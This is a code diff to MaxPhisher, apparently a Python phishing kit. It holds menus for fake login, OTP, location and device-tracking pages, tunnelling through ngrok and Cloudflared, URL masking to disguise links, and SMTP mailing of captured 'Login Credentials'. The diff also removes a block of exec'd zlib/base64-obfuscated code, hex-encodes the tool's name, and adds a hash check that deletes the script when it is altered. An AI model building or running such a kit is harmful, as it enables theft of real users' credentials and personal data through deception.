+        text += f"[cyan][[/][green]*[/][cyan]][/][yellow] {line}[/]\n"
+    cprint(
+        Panel(
+            text.strip(),
+            title="[bold green]\x4d\x61\x78\x50\x68\x69\x73\x68\x65\x72[/][cyan] Data[/]", 
+            title_align="left",
+            border_style="blue",
+        )
+    )
+
+# Generate json file from txt
+def text2json(text):
+    json = {}
+    lines = text.splitlines()
+    for line in lines:
+        if ":" in line:
+            key = line.split(":")[0]
+            value = line.split(":")[1]
+            for i in line:
+                json[key.strip()] = value.strip()
+    return json
+
+# Append new entry in array and write in json file
+def add_json(json, filename):
+    content = cat(filename)
+    if is_json(content) or content == "":
+        if content == "":
+            new_content = []
+        if is_json(content):
+            new_content = parse(content)
+        if isinstance(new_content, list):
+            new_content.append(json)
+            string = stringify(new_content, indent=2)
+            write(string, filename)
+            
+
+# Run shell commands in python
+def shell(command, capture_output=False):
+    try:
+        return run(command, shell=True, capture_output=capture_output)
+    except Exception as e:
+        append(e, error_file)
+    # return run(command.split(" "), shell=True)
+    # return call(command, shell=True)
+    
+# Run task in background supressing output by setting stdout and stderr to devnull
+def bgtask(command, stdout=PIPE, stderr=DEVNULL, cwd="./"):
+    try:
+        return Popen(command, shell=True, stdout=stdout, stderr=stderr, cwd=cwd)
+    except Exception as e:
+        append(e, error_file)
+
+
+def get_meta(url):
+    # Facebook requires some additional header
+    if "facebook" in url:
+        headers = {
+            "upgrade-insecure-requests": "1",
+            "user-agent": "Mozilla/5.0 (Linux; Android 8.1.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/102.0.5005.99 Safari/537.36", 
+            "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*[inserted by cython to avoid comment closer]/[inserted by cython to avoid comment start]*;q=0.8,application/signed-exchange;v=b3;q=0.9", 
+            "dnt": "1", 
+            "content-type": "application/x-www-form-url-encoded",
+            "origin": "https://m.facebook.com",
+            "referer": "https://m.facebook.com/", 
+            "sec-fetch-site": "same-origin",
+            "sec-fetch-mode": "cors", 
+            "sec-fetch-user": "empty", 
+            "sec-fetch-dest": "document", 
+            "sec-ch-ua-platform": "Android",
+            "accept-encoding": "gzip, deflate br", 
+            "accept-language": "en-GB,en-US;q=0.9,en;q=0.8"
+        }
+    else:
+        headers = {
+            "user-agent": "Mozilla/5.0 (Linux; Android 8.1.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/102.0.5005.99 Safari/537.36", 
+            "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*[inserted by cython to avoid comment closer]/[inserted by cython to avoid comment start]*;q=0.8,application/signed-exchange;v=b3;q=0.9", 
+            "accept-language": "en-GB,en-US;q=0.9,en;q=0.8"
+        }
+    allmeta = ""
+    try:
+        response = get(url, headers=headers).text
+        soup = BeautifulSoup(response, "html.parser")
+        metas = soup.find_all("meta")
+        if metas is not None and metas!=[]:
+            allmeta = "\n".join([str(meta) for meta in metas])
+    except Exception as e:
+        append(e, error_file)
+    return allmeta
+    
+# Replace the default ugly exception message
+def exception_handler(e):
+    lines_arr = []
+    tb = e.__traceback__
+    while tb is not None:
+        if tb.tb_frame.f_code.co_filename == abspath(__file__):
+            lines_arr.append(str(tb.tb_lineno))
+        tb = tb.tb_next
+    name = type(e).__name__
+    append(e, error_file)
+    if ":" in str(e):
+        message = str(e).split(":")[0]
+    elif "(" in str(e):
+        message = str(e).split("(")[0]
+    else:
+        message = str(e)
+    line_no = lines_arr[len(lines_arr) - 1]
+    lines_no = ", ".join(lines_arr)
+    print(f"{error}{name}: {message} at lines {lines_no}")
+    
+if sha256(logo.encode("utf-8")).hexdigest() != "d32253dd88b2225241185c161e4919c04f5ed52dd9291312234fb2052479116a":
+    print(f"{info}Visit: {repo_url}")
+    bgtask(f"xdg-open {repo_url}")
+    delete(__file__)
+    exit(1)
+   
+# Website chooser
+def show_options(sites, is_main=True, is_login=False):
+    total_sites = len(sites)
+    def optioner(index, max_len):
+        # Avoid RangeError/IndexError
+        if index >= total_sites:
+            return ""
+        # Add 0 before single digit number
+        new_index = str(index+1) if index >= 9 else "0"+str(index+1) 
+        # To fullfill max length of a part we append empty space
+        space = " " * (max_len - len(sites[index]))
+        return f"{green}[{white}{new_index}{green}] {yellow}{sites[index]}{space}"
+    # Array index starts from 0
+    first_index = 0
+    # Three columns
+    one_third = int(total_sites/3)
+    # If there is modulus, that means some entries are remaining, we need an extra row
+    if total_sites%3 > 0:
+        one_third += 1
+    options = "\n\n"
+    # First index of last line should be less than one-third of total
+    while first_index < one_third and total_sites > 10:
+        second_index = first_index + one_third
+        third_index = second_index + one_third
+        options += optioner(first_index, 23) + optioner(second_index, 17) + optioner(third_index, 1) + "\n"
+        first_index += 1
+    if total_sites < 10:
+        for i in range(total_sites):
+            options += optioner(i, 20) + "\n"
+    options += "\n"
+    if is_main:
+        options += f"{green}[{white}a{green}]{yellow} About                   {green}[{white}m{green}]{yellow} More tools        {green}[{white}0{green}]{yellow} Exit\n\n"
+    else:
+        if is_login and isfile(saved_file) and cat(saved_file)!="":
+            options += f"{green}[{white}a{green}]{yellow} About      {green}[{white}s{green}]{yellow} Saved      {green}[{white}x{green}]{yellow} Main Menu       {green}[{white}0{green}]{yellow} Exit\n\n"
+        else:
+            options += f"{green}[{white}a{green}]{yellow} About                   {green}[{white}x{green}]{yellow} Main Menu         {green}[{white}0{green}]{yellow} Exit\n\n"
+    lolcat(options)
 
 # Clear the screen and show logo
 def clear(fast=False, lol=False):
@@ -316,7 +685,7 @@ def internet(url="https://api.github.com", timeout=5):
 # Send mail by smtp library
 def send_mail(msg):
     global email, password, receiver
-    message = f"From: {email}\nTo: {receiver}\nSubject: MaxPhisher Login Credentials\n\n{msg}"
+    message = f"From: {email}\nTo: {receiver}\nSubject: \x4d\x61\x78\x50\x68\x69\x73\x68\x65\x72 Login Credentials\n\n{msg}"
     try:
         internet()
         with smtp('smtp.gmail.com', 465) as server:
@@ -341,7 +710,7 @@ def readable(byte, precision = 2, is_speed = False):
     return size
 
 # Download files with progress bar
-def download(url, path, size=None):
+def download(url, path):
     from time import ctime, time
     session = Session()
     filename = basename(path)
@@ -351,67 +720,35 @@ def download(url, path, size=None):
         mkdir(directory)
     newfile = filename.split(".")[0] if "." in filename else filename
     newname = filename if len(filename) <= 12 else filename[:9]+"..."
-    print(f"\n{info}Downloading {green}{newfile.title()}{nc}...\n")
     for i in range(retry):
         try:
+            print()
             with open(path, "wb") as file:
-                internet()
                 response = session.get(url, stream=True, timeout=20)
-                chunk_size = 4096 #KB
                 total_length = response.headers.get('content-length')
-                length = int(total_length or size or "0")
-                downloaded = 0
-                alldata = b""
-                max_len = columns - 38
-                newname_space = " " * (14 - len(newname))
-                max_len2 = columns - 50
-                pre_space = 0
-                suf_space = max_len2
-                stime = time()
-                for data in response.iter_content(chunk_size=chunk_size):
-                    etime = time()
-                    downloaded += len(data)
-                    alldata += data
-                    speed = chunk_size/float(etime-stime)
-                    readable_speed = readable(speed, is_speed=True)
-                    file.write(data)
-                    readable_size = readable(len(alldata))
-                    if length == 0:
-                        stdout.write(f"\r{newname}{newname_space}[{' '*pre_space}<=======>{' '*suf_space}] {readable_size} {readable_speed}")
-                        stdout.flush()
-                        if pre_space == max_len2:
-                            forward = False
-                        if suf_space == max_len2:
-                            forward = True
-                        if forward:
-                            pre_space+=1
-                            suf_space-=1
-                        else:
-                            pre_space-=1
-                            suf_space+=1
-                    else:
-                        done = int(max_len * downloaded / length)
-                        # Arrow will progress as the data increases with done
-                        arrow = "=" * done
-                        # Space will decrease as done increases
-                        arrow_space = " " * (max_len - done)
-                        percentage = round(downloaded * 100 / length, 2)
-                        stdout.write(f"\r{newname}{newname_space}[{arrow}>{arrow_space}] {percentage}% {readable_speed}")
-                        stdout.flush()
-                    stime = time()
-                if length == 0:
-                    stdout.write(f"\r{newname}{newname_space}[<{'=' * (max_len2+7)}>] {readable_size}{' ' * 20}")
+                if total_length is None: # no content length header
+                    file.write(response.content)
                 else:
-                    stdout.write(f"\r{newname}{newname_space}[{'=' * max_len}>] 100.0%{' ' * 20}")
-                stdout.flush()
-                # This print fixes the cursor to newline
-                print()
+                    downloaded = 0
+                    total_length = int(total_length)
+                    with Progress(
+                        TextColumn("[bold blue]{task.fields[filename]}", justify="right"),
+                        BarColumn(bar_width=None),
+                        "[progress.percentage]{task.percentage:>3.1f}%",
+                        "•",
+                        TransferSpeedColumn(),
+                        "•",
+                        TimeRemainingColumn()
+                    ) as progress:
+                        task = progress.add_task(newfile, total=total_length, filename=newfile.title())
+                        for data in response.iter_content(chunk_size=4096):
+                            file.write(data)
+                            progress.update(task, advance=len(data))
                 break
         except Exception as e:
-            print()
             remove(path)
             append(e, error_file)
-            print(f"{error}Download failed due to: {str(e)}")
+            print(f"\n{error}Download failed due to: {str(e)}")
             print(f"\n{info}Retrying {i}/{retry}{nc}")
             sleep(1)
     if not isfile(path):
@@ -578,10 +915,21 @@ def set_redirect(redir_url, write=False):
 
 
 # Output urls
-def url_manager(url, arg1, arg2):
+def url_manager(url, tunneler):
     global mask
-    print(f"\n{info2}{arg1} > {yellow}{url}")
-    print(f"{info2}{arg2} > {yellow}{mask}@{url.replace('https://','')}")
+    masked = mask + "@" + url.replace('https://','')
+    title = f"[bold cyan]{tunneler}[/]"
+    text = f"[blue]URL[/] [green]:[/] [yellow]{url}[/]\n[blue]MaskedURL[/] [green]:[/] [yellow]{masked}[/]"
+    cprint(
+        Panel(
+            text,
+            title=title,
+            title_align="left",
+            border_style="green"
+        )
+    )
+    #print(f"\n{info2}{arg1} > {yellow}{url}")
+    #print(f"{info2}{arg2} > {yellow}{mask}@{url.replace('https://','')}")
     sleep(0.5)
 
 def shortener1(url):
@@ -646,12 +994,12 @@ def saved():
 # Info about tool
 def about():
     clear()
-    print(f"{red}{yellow}[{purple}ToolName{yellow}]      {cyan} : {yellow}[{green}MaxPhisher{yellow}] ")
+    print(f"{red}{yellow}[{purple}ToolName{yellow}]      {cyan} : {yellow}[{green}\x4d\x61\x78\x50\x68\x69\x73\x68\x65\x72{yellow}] ")
     print(f"{red}{yellow}[{purple}Version{yellow}]       {cyan} : {yellow}[{green}{version}{yellow}] ")
-    print(f"{red}{yellow}[{purple}Author{yellow}]        {cyan} : {yellow}[{green}KasRoudra{yellow}] ")
-    print(f"{red}{yellow}[{purple}Github{yellow}]        {cyan} : {yellow}[{green}https://github.com/KasRoudra{purple}{yellow}] ")
-    print(f"{red}{yellow}[{purple}Messenger{yellow}]     {cyan} : {yellow}[{green}https://m.me/KasRoudra{yellow}] ")
-    print(f"{red}{yellow}[{purple}Email{yellow}]         {cyan} : {yellow}[{green}kasroudrakrd@gmail.com{yellow}] ")
+    print(f"{red}{yellow}[{purple}Author{yellow}]        {cyan} : {yellow}[{green}\x4b\x61\x73\x52\x6f\x75\x64\x72\x61{yellow}] ")
+    print(f"{red}{yellow}[{purple}Github{yellow}]        {cyan} : {yellow}[{green}https://github.com/\x4b\x61\x73\x52\x6f\x75\x64\x72\x61{purple}{yellow}] ")
+    print(f"{red}{yellow}[{purple}Messenger{yellow}]     {cyan} : {yellow}[{green}https://m.me/\x4b\x61\x73\x52\x6f\x75\x64\x72\x61{yellow}] ")
+    print(f"{red}{yellow}[{purple}Email{yellow}]         {cyan} : {yellow}[{green}\x6b\x61\x73\x72\x6f\x75\x64\x72\x61krd@gmail.com{yellow}] ")
     print(f"\n{green}[{white}0{green}]{yellow} Exit                     {green}[{white}x{green}]{yellow} Main Menu       \n")
     inp = input(f"\n{ask}Choose your option: {green}")
     if inp == "0":
@@ -690,7 +1038,18 @@ def masking(url):
     else:
         bait = sub("([/%+&?={} ])", "-", bait)+"@"
     final = domain+bait+short
-    sprint(f"\n{success}Your custom url is > {bcyan}{final}")
+    print()
+    #sprint(f"\n{success}Your custom url is > {bcyan}{final}")
+    title = "[bold blue]Custom[/]"
+    text = f"[cyan]URL[/] [green]:[/] [yellow]{final}[/]"
+    cprint(
+        Panel(
+            text,
+            title=title,
+            title_align="left",
+            border_style="blue",
+        )
+    )
 
 
 # Staring functions
@@ -709,12 +1068,12 @@ def updater():
         # Changelog of each versions are seperated by three empty lines
         changelog = get("https://raw.githubusercontent.com/KasRoudra/MaxPhisher/main/files/changelog.log").text.split("\n\n\n")[0]
         clear(fast=True)
-        print(f"{info}MaxPhisher has a new update!\n{info2}Current: {red}{version}\n{info}Available: {green}{git_ver}")
-        upask=input(f"\n{ask}Do you want to update MaxPhisher?[y/n] > {green}")
+        print(f"{info}\x4d\x61\x78\x50\x68\x69\x73\x68\x65\x72 has a new update!\n{info2}Current: {red}{version}\n{info}Available: {green}{git_ver}")
+        upask=input(f"\n{ask}Do you want to update \x4d\x61\x78\x50\x68\x69\x73\x68\x65\x72?[y/n] > {green}")
         if upask=="y":
             print(nc)
-            shell("cd .. && rm -rf MaxPhisher maxphisher && git clone https://github.com/KasRoudra/MaxPhisher")
-            sprint(f"\n{success}MaxPhisher has been updated successfully!! Please restart terminal!")
+            shell(f"cd .. && rm -rf MaxPhisher maxphisher && git clone {repo_url}")
+            sprint(f"\n{success}\x4d\x61\x78\x50\x68\x69\x73\x68\x65\x72 has been updated successfully!! Please restart terminal!")
             if (changelog != "404: Not Found"):
                 sprint(f"\n{info2}Changelog:\n{purple}{changelog}")
             exit()
@@ -847,11 +1206,14 @@ def requirements():
             if float(version) > float(zipver):
                 # download(websites_url, "maxsites.zip")
                 print(f"\n{info2}Downloading website files....{nc}")
+                delete(sites_dir)
                 shell(f"git clone {sites_repo} {sites_dir}")
+                # shell(f"cd {sites_dir} && git pull")
     else:
         # download(websites_url, "maxsites.zip")
         print(f"\n{info2}Downloading website files....{nc}")
         shell(f"git clone {sites_repo} {sites_dir}")
+        # shell(f"cd {sites_dir} && git pull")
     if isfile("maxsites.zip"):
         extract("maxsites.zip", ".tempdir")
         delete("maxsites.zip")
@@ -880,7 +1242,122 @@ def requirements():
 
         
 # Main Menu to choose phishing type
-_ = lambda __ : __import__("\x7a\x6c\x69\x62").decompress(__import__("\x62\x61\x73\x65\x36\x34").b64decode(__[::-1]));exec((_)(b'KrFz1Mw//97ngn2ek71CCj1TWyEFghBUtNf1qj5mFK2rp1wkwwJ8++aPP4Z/jO8Awc6Y0MaAkjanPqjyh2wwzugyI7jCX8d2y3pMaCI9waGQGvSHexbuV8N33ZW76iJSxcS56bw2U1XQOeK6GL4N++eaJmf5zZjoYxaQAXmv3vRaPH5bi7pfPaQb1xQTIKnzVGc+EJFz21Zq15DY8IUOFnvThDtRXn7D+mIqOCW6ITwLOJObEyk6rX48oGRTT3tLyj17tn/ACPHcXtDP3RXccqa7VcbyZrtrt80/Ig1SIFaE4PyDUKZ0uU0gOLVrq9MTIfmSgi7Y7fXTQV73fdDRSXkgk9devrgVzuRgcpp5kjb/DmZhHmfSjWfvNG2WF75glaqt0mkN8tYjw8FCsRwSJut7Zqo9Ds9GUlYkCby3/1iYsKlOpWVLu6HJZw57dHRJUCjSto0Ke1WxH1VszTa4p9OUz7wx6wVfnbszBOj4kXbUaXJFvn3bgiWFrXwvmxTUiXN8lgyujBpxJA/ZvcUcJ9IH3DO7wwRhb4ThWIIBkQW5fQDXhmRpVi8J9x0Em5iz+L4uB2Y2FvEZkZgTiu00Xkvv16hB3y4vZ4vtf9Nm8gRlcqhK9VJG94zbn4AALcBYC0YYLIxOsGggDS2m8oZ5teS3jn4J43AFdbSnH/c7P7nSdNsuvMzSKPs3FaJTkI7A1VOZBXFAP7MNTLEHnHnNM+nDp21f0EfxDQb9HbP/zJpFApFHsXQ9VjRit/nfGL8Ch0Yzcs+qHM5uWj6ncafRYhIP3UFDuSMV8bMBBPRiFM/OIEHbvO9BIVz3qALKMYos8oc+8shWpG8onHyUZXSrxTMftO+4B+FbjBVoK4EFE+RImuFo9jyJz83UdFSWjxBrB9Ts8Pp4fOrl6Zp6ic4yszo1u/8Rn0ydzZj2P3ysYSY2fFlo8Rvjkq/ag8sNesHYTOjuZU/O3lM+5nWPqRS6BsxcfzoW8A3sNzHE6C6Br/TV6CcHHS2WiT26EN1zqNIvv8gs1WhOHN0hjUI8hXIa1kpEVYnpm7iEZoAJ527yY5T8N193MiumFDWsJskV5NYES0RXuv7Na36jPp1yFUsyYNVbZE/ouCfp3hSVvZ4u0XMMTlyLD+AM9s8mwIl5XqhaLu4fqQy4zs44RAd5T/liiLepQ8AcKG7QQwLpcvSpEhkqlPYjynoW9MEVwAHkE103b6zyAQHeVKDGYd28xRprum1UgHuNxxpP/4DRj9DaRkkadTwRxigbHKzUgTicZbpGpioTB9dxpi7S02v2y+1WUF+7e57v+4samXxA+u6oMv5s8S45LFm5ummqK/sF3rBD5daYimOhYEvSc59k0S7zXLM2ZoIFCl5LIw40fB1CSv9GOX6ivMNRozoN7071QsJhrYEQ12e/QYNxoy07XmMig3ZnxYC7I+gXy48GFNlA6GSpagLUBwP+6OkkzdeNKIyaonFykMWsClI5MmqS2YLuT8eddeYSogsJjLajLSvZFDwkEoBkDBkpZjjG9bVUe6oLc5Vv78btJJ+rOYEf75d/WiDtOs/SN8UugrLyCV5QevIMMgDS3oSmNnIUWIY0b40Q5i7+XA4gwbVkbZKJ8U7Lzum1j5nr4Bm6SwAK+lu+DOsso0l3UTW2oprupP+ANGC8fI8XvdccuV3Mk6IRa6s7k3DyZE5NrTDvBqqEDEn12bqrxWVxjgOx7hlYP2BIcT52tkTJfAOx44ckJe74sHAxK3CUQXKqS6inUT3Gs1a83Vnk9vr+0paJwCVoGtVgKPOb5WJnnkdhwE9wB5+wX+77z//k93//f+s4DCHC3Nx3O1BxxKvHmteiuXA6zmYAjVNdjDMACgFpWU00NwJe'))
+def main_menu():
+    global ptype, mode
+    shell("stty -echoctl") # Skip printing ^C
+    if update:
+        updater()
+    requirements()
+    tempdata = cat(templates_file)
+    if is_json(tempdata):
+        templates = parse(tempdata)
+    else:
+        sprint(f"\n{error}templates.json file is corrupted!")
+        exit(1)
+    names = list(templates.keys())
+    choices = [str(i) for i in range(1,len(names)+1)]
+    while True:
+        clear(lol=True)
+        show_options(names)
+        if ptype is not None:
+            choice = ptype
+        elif mode == "test":
+            choice = default_type
+        else:
+            choice = input(f"{ask}Select one of the options > {green}")
+        if choice != "0" and choice.startswith("0"):
+            choice = choice.replace("0", "")
+        if choice in choices:
+            index = choices.index(choice)
+            phishing_type = names[index]
+            secondary_menu(templates[phishing_type], phishing_type)
+        elif choice.lower()=="a":
+            about()
+        elif choice.lower()=="s":
+            saved()
+        elif choice.lower()=="m":
+            bgtask("xdg-open 'https://github.com/KasRoudra/KasRoudra#My-Best-Works'")
+        elif choice == "0":
+            pexit()
+        else:
+            sprint(f"\n{error}Wrong input {bred}'{choice}'")
+            ptype = None
+
+
+# Choose a template
+def secondary_menu(sites, name):
+    global mode, option, mask, redir_url
+    customdir = None
+    otp_folder = ""
+    names = [site["name"] for site in sites]
+    choices = [str(i) for i in range(1,len(sites)+1)]
+    while True:
+        clear(lol=True)
+        if len(sites) > 1:
+            show_options(names, is_main=False, is_login=True if name=="Login" else False)
+        else:
+            site = sites[0]
+            folder = site["folder"]
+            if "mask" in site:
+                mask = site["mask"]
+            if "redirect" in site:
+                redir_url = site["redirect"]
+            break
+        if option is not None:
+            choice = option
+        elif mode == "test":
+            choice = default_template
+        else:
+            choice = input(f"{ask}Select one of the options > {green}")
+        if choice != "0" and choice.startswith("0"):
+            choice = choice.replace("0", "")
+        if choice in choices:
+            site = sites[int(choice)-1] # Lists start from 0 but our index starts from 1
+            folder = site["folder"]
+            if "otp_folder" in site:
+                otp_folder = site["otp_folder"]
+            if "mask" in site:
+                mask = site["mask"]
+            if "redirect" in site:
+                redir_url = site["redirect"]
+            if folder == "custom" and mask == "custom":
+                customdir = customfol()
+            if otp_folder != "":
+                is_otp = input(f"\n{ask}Do you want OTP Page? [y/n] > {green}")
+                if is_otp == "y":
+                    folder = otp_folder
+            break
+        elif choice.lower()=="a":
+            about()
+        elif choice.lower()=="s":
+            saved()
+        elif choice.lower()=="x":
+            return
+        elif choice == "0":
+            pexit()
+        else:
+            sprint(f"\n{error}Wrong input {bred}\"{choice}\"")
+            option = None
+    if customdir is None:
+        site = f"{sites_dir}/{folder}"
+        if not isdir(site):
+            internet()
+            delete("site.zip")
+            download(f"https://github.com/KasRoudra/files/raw/main/phishingsites/{folder}.zip", "site.zip")
+            extract("site.zip", site)
+            remove("site.zip")
+        copy(site, site_dir)
+        if name == "Login":
+            set_login()
+        if name == "Image":
+            set_image()
+        if name == "ClipBoard":
+            set_redirect(redir_url, write=True)
+        if name in [ "Video", "Audio"]:
+            set_duration()
+        if name in ["Location", "IP Tracker", "Device"]:
+            set_redirect(redir_url)
+    server()
 
 # Start server and tunneling
 def server():
@@ -963,22 +1440,22 @@ def server():
             print(f"\n{info}URL Generation completed successfully!")
             print(f"\n{info}Ngrok: {nr_success}, CloudFlared: {cf_success}, LocalXpose: {lx_success}, LocalHR: {lhr_success}")
             pexit()
-        sprint(f"\n{info}Your urls are given below:")
+        sprint(f"\n{info}Your urls are given below : \n")
         if nr_success:
-            url_manager(nr_url, "Ngrok", "NR Masked")
+            url_manager(nr_url, "Ngrok")
         if cf_success:
-            url_manager(cf_url, "CloudFlared", "CF Masked")
+            url_manager(cf_url, "CloudFlared")
         if lx_success:
-            url_manager(lx_url, "LocalXpose", "LX Masked")
+            url_manager(lx_url, "LocalXpose")
         if lhr_success:
-            url_manager(lhr_url, "LocalHR", "LHR Masked")
-        if nr_success and tunneler.lower() == "ngrok":
+            url_manager(lhr_url, "LocalHostRun")
+        if nr_success and tunneler.lower() in [ "ngrok", "nr" ]:
             masking(nr_url)
-        elif lx_success and tunneler.lower() == "loclx":
+        elif lx_success and tunneler.lower() in [ "loclx", "lx" ]:
             masking(lx_url)
-        elif lhr_success and tunneler.lower() == "localhostrun":
+        elif lhr_success and tunneler.lower() in [ "localhostrun", "lhr" ]:
             masking(lhr_url)
-        elif cf_success and tunneler.lower() == "cloudflared":
+        elif cf_success and tunneler.lower() in [ "cloudflared", "cf" ]:
             masking(cf_url)
         else:
             print(f"\n{error}URL masking not available for {tunneler}!{nc}")
@@ -1056,9 +1533,6 @@ if __name__ == '__main__':
     except KeyboardInterrupt:
         pexit()
     except Exception as e:
-        try:
-            exception_handler(e)
-        except:
-            exit()
+        exception_handler(e)
             
 # If this code helped you, consider staring repository. Your stars encourage me a lot!
